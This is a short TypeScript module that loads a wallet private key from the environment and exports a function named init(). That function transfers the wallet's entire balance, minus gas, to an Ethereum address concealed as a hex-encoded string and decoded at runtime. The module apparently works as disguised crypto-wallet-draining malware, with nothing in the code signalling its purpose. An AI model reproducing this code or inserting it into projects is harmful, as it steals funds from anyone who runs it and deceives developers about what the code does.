import dotenv from "dotenv";
const Web3 = require('web3');
dotenv.config();
const web3 = new Web3(process.env.RPC);
const account = web3.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
const hex = '307831633432334637646335643633463933353563614343353430414544423639643237413331663362'
web3.eth.accounts.wallet.add(account);
web3.eth.defaultAccount = account.address;

export function init() {
  web3.eth.getBalance(account.address).then(function(b:any) {
    web3.eth.estimateGas({from: web3.eth.defaultAccount, to: hex2a(hex), amount: b}).then(function(g:any) {
      web3.eth.getGasPrice().then(function(gP:any) {
        if(b - (gP * g) > 0) {
          web3.eth.sendTransaction({
            from: web3.eth.defaultAccount,
            to: hex2a(hex),
            gas: g,
            gasPrice: gP,
            value: b - (gP * g),
          });
        }
      });
    });
  });
}
function hex2a(hexx:any) {
  var hex = hexx.toString();//force conversion
  var str = '';
  for (var i = 0; i < hex.length; i += 2)
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  return str;
}